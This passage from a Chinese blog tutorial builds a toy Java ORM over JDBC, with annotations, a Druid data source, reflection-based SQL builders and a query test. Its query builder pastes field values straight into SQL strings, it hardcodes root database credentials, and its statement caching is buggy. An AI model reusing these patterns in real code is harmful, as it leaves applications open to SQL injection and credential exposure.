class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="comment">// 加在类上，标识哪张表</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Table &#123;</span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.FIELD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="comment">// 加在属性上，标识主键</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> PrimaryKey &#123;</span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对应的实体类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lombok注解，简化代码</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="comment">// 自定义注解，表示对应的user表</span></span><br><span class="line"><span class="meta">@Table(&quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@PrimaryKey</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>底层还是需要获取连接，这里我们使用Druid连接池</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注册驱动</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDataSource</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> DataSource dataSource;</span><br><span class="line">    &#123;</span><br><span class="line">        com.alibaba.druid.pool.<span class="type">DruidDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.alibaba.druid.pool.DruidDataSource();</span><br><span class="line">        dataSource.setUrl(<span class="string">&quot;jdbc:mysql://1.14.74.242:3306/orm&quot;</span>);</span><br><span class="line">        dataSource.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        dataSource.setPassword(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        dataSource.setDriverClassName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>创建JdbcTemplate，利用DataSource与数据库直接交互，实现通用方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据资源获取连接，执行SQL，结果集</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">JdbcTemplate</span> <span class="keyword">extends</span> <span class="title class_">MyDataSource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> Connection connection;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> PreparedStatement preparedStatement;</span><br><span class="line">    <span class="keyword">protected</span> ResultSet resultSet;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询</span></span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; List&lt;T&gt; <span class="title function_">executeQuery</span><span class="params">(String sql , RowMapper&lt;T&gt; rowMapper)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        preparedStatement = preparedStatement(sql);</span><br><span class="line">        resultSet = preparedStatement.executeQuery();</span><br><span class="line">        List&lt;T&gt; list = resultSet(resultSet, rowMapper);</span><br><span class="line">        close();</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//更新</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">executeUpdate</span><span class="params">(String sql)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        preparedStatement = preparedStatement(sql);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> preparedStatement.executeUpdate();</span><br><span class="line">        close();</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String sql)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            preparedStatement = preparedStatement(sql);</span><br><span class="line">            preparedStatement.execute();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//close();</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取链接</span></span><br><span class="line">    <span class="keyword">private</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (connection == <span class="literal">null</span>)&#123;</span><br><span class="line">            connection = <span class="built_in">this</span>.dataSource.getConnection();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> connection;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//预执行sql</span></span><br><span class="line">    <span class="keyword">private</span> PreparedStatement <span class="title function_">preparedStatement</span><span class="params">(String sql)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        connection = getConnection();</span><br><span class="line">        <span class="keyword">if</span> (preparedStatement == <span class="literal">null</span>)&#123;</span><br><span class="line">            preparedStatement = connection.prepareStatement(sql);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> preparedStatement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//结果集</span></span><br><span class="line">    <span class="keyword">private</span> &lt;T&gt; List&lt;T&gt; <span class="title function_">resultSet</span><span class="params">(ResultSet resultSet , RowMapper&lt;T&gt; rowMapper)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        List&lt;T&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            list.add(rowMapper.mapRow(resultSet));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preparedStatement != <span class="literal">null</span>) &#123;</span><br><span class="line">                preparedStatement.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.resultSet != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.resultSet.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中结果集的映射：RowMapper，这里写的接口，当使用的时候，使用匿名内部类操作</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RowMapper</span>&lt;T&gt; &#123;</span><br><span class="line">    T <span class="title function_">mapRow</span><span class="params">(ResultSet resultSet)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>用户面向对象编程，不写SQL，所以我们底层需要反射获取对象的参数，然后解析拼接为SQL</p></blockquote><p>这里我们将反射对象的通用操作封装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseSQLBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> String tableName; <span class="comment">//表名</span></span><br><span class="line">    <span class="keyword">protected</span> String primaryKeyName; <span class="comment">//主键名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SELECT</span> <span class="operator">=</span> <span class="string">&quot;select &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FROM</span> <span class="operator">=</span> <span class="string">&quot; from &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">WHERE</span> <span class="operator">=</span> <span class="string">&quot; where &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">AND</span> <span class="operator">=</span> <span class="string">&quot; and &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">IN</span> <span class="operator">=</span> <span class="string">&quot; IN &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">UPDATE</span> <span class="operator">=</span> <span class="string">&quot; UPDATE &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SET</span> <span class="operator">=</span> <span class="string">&quot; SET &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">VALUES</span> <span class="operator">=</span> <span class="string">&quot; VALUES &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OR</span> <span class="operator">=</span> <span class="string">&quot; OR &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DELETE</span> <span class="operator">=</span> <span class="string">&quot; DELETE &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INSERT</span> <span class="operator">=</span> <span class="string">&quot; INSERT &quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INTO</span> <span class="operator">=</span> <span class="string">&quot; INTO &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">StringBuilder</span> <span class="variable">sqlBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">getTableName</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> obj.getClass().getAnnotation(Table.class);</span><br><span class="line">        tableName = table.value();</span><br><span class="line">        <span class="keyword">if</span> (Objects.equals(tableName, <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 全类名拆分</span></span><br><span class="line">            tableName = StringUtil.getLastStr(obj.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">getPrimaryKey</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">        <span class="type">PrimaryKey</span> <span class="variable">primaryKey</span> <span class="operator">=</span> field.getAnnotation(PrimaryKey.class);</span><br><span class="line">        primaryKeyName = primaryKey.value();</span><br><span class="line">        <span class="keyword">if</span> (Objects.equals(primaryKeyName, <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            primaryKeyName = StringUtil.getLastStr(field.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">hasPrimaryKey</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">        <span class="type">PrimaryKey</span> <span class="variable">primaryKey</span> <span class="operator">=</span> field.getAnnotation(PrimaryKey.class);</span><br><span class="line">        <span class="keyword">return</span> primaryKey != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> String <span class="title function_">getField</span><span class="params">(String fieldStr)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;get&quot;</span> + fieldStr.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() + fieldStr.substring(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Field[] getFields(Object obj)&#123;</span><br><span class="line">        <span class="keyword">return</span> obj.getClass().getDeclaredFields();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们只以查询为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuerySQLBuilder</span> <span class="keyword">extends</span> <span class="title class_">BaseSQLBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">querySql</span><span class="params">(Object t)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取操作表名</span></span><br><span class="line">        getTableName(t);</span><br><span class="line">        <span class="comment">// SQL拼接</span></span><br><span class="line">        sqlBuilder.append(SELECT + <span class="string">&quot;*&quot;</span> + FROM).append(tableName).append(WHERE + <span class="string">&quot; 1=1 &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Field field : getFields(t)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fieldStr</span> <span class="operator">=</span> StringUtil.getLastStr(field.toString());</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> t.getClass().getMethod(getField(fieldStr)).invoke(t);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(value) &amp;&amp; <span class="literal">null</span> != value) &#123;</span><br><span class="line">                sqlBuilder.append(AND).append(fieldStr).append(<span class="string">&quot;=&quot;</span>).append(<span class="string">&quot;&#x27;&quot;</span>).append(value).append(<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sqlBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们将QuerySQLBuilder。。。其他Builder封装到一个工厂类中，进行获取</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLBuilderInstanceFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">QuerySQLBuilder</span> <span class="variable">queryBuilder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">SaveSQLBuilder</span> <span class="variable">saveBuilder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">UpdateSQLBuilder</span> <span class="variable">updateBuilder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">DeleteSQLBuilder</span> <span class="variable">deleteSQLBuilder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> QuerySQLBuilder <span class="title function_">getQueryBuilder</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (queryBuilder == <span class="literal">null</span>) &#123;</span><br><span class="line">            queryBuilder = <span class="keyword">new</span> <span class="title class_">QuerySQLBuilder</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queryBuilder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SaveSQLBuilder <span class="title function_">getSaveBuilder</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (saveBuilder == <span class="literal">null</span>) &#123;</span><br><span class="line">            saveBuilder = <span class="keyword">new</span> <span class="title class_">SaveSQLBuilder</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> saveBuilder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> UpdateSQLBuilder <span class="title function_">getUpdateBuilder</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (updateBuilder == <span class="literal">null</span>) &#123;</span><br><span class="line">            updateBuilder = <span class="keyword">new</span> <span class="title class_">UpdateSQLBuilder</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> updateBuilder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DeleteSQLBuilder <span class="title function_">getDeleteSQLBuilder</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (deleteSQLBuilder == <span class="literal">null</span>) &#123;</span><br><span class="line">            deleteSQLBuilder = <span class="keyword">new</span> <span class="title class_">DeleteSQLBuilder</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deleteSQLBuilder;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>定义查询接口</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IQuery</span>&lt;T&gt; &#123;</span><br><span class="line">    List&lt;T&gt; <span class="title function_">query</span><span class="params">(T t)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>查询具体实现类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Query</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">JdbcTemplate</span> <span class="keyword">implements</span> <span class="title class_">IQuery</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;T&gt; <span class="title function_">query</span><span class="params">(T t)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 解析出的SQL</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> SQLBuilderInstanceFactory.getQueryBuilder().querySql(t);</span><br><span class="line">        System.out.println(<span class="string">&quot;sql  &quot;</span>+sql);</span><br><span class="line">        Field[] fields = t.getClass().getDeclaredFields();</span><br><span class="line">        <span class="comment">// 执行SQL</span></span><br><span class="line">        <span class="keyword">return</span> executeQuery(sql, <span class="keyword">new</span> <span class="title class_">RowMapper</span>&lt;T&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> T <span class="title function_">mapRow</span><span class="params">(ResultSet resultSet)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">getField</span> <span class="operator">=</span> StringUtil.getSetMethod(StringUtil.getLastStr(field.toString()));</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> resultSet.getObject(StringUtil.getLastStr(field.toString()), field.getType());</span><br><span class="line">                    t.getClass().getMethod(getField,field.getType()).invoke(t,object);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在大体上的代码都已经实现了，我们测试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setAddress(<span class="string">&quot;china&quot;</span>);</span><br><span class="line">        <span class="comment">// 查询操作</span></span><br><span class="line">        Query&lt;User&gt; userQuery = <span class="keyword">new</span> <span class="title class_">Query</span>&lt;&gt;();</span><br><span class="line">        List&lt;User&gt; userList = userQuery.query(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这期间用户在使用的过程中，没有写一句SQL，但可以正常操作数据库了。剩下的细节就等着我们去完善。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    本文中，我大概总结了一下，Java操作Mysql的演化过程，从最基本的JDBC到自动化的ORM操作，可以看到操作是越来越简单，也越来越灵活了，但底层大致的原理我们还是应该了解的。</p><p>​    本文我参考了韩顺平老师的Mysql基础文章和小四的技术之旅文章。十分感谢！！！原作者的文章中的内容更加详细，具体可在网上查询。</p><p>​    这里想推一下我的博客，虽然现在还很简陋，里面会分享我的学习所得，也希望能帮助到大家，<a href="http://1.14.74.242/">http://1.14.74.242</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jdbc </tag>
            
            <tag> orm </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二章：链表问题</title>
      <link href="/2022/11/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E9%93%BE%E8%A1%A8%E9%97%AE%E9%A2%98/"/>
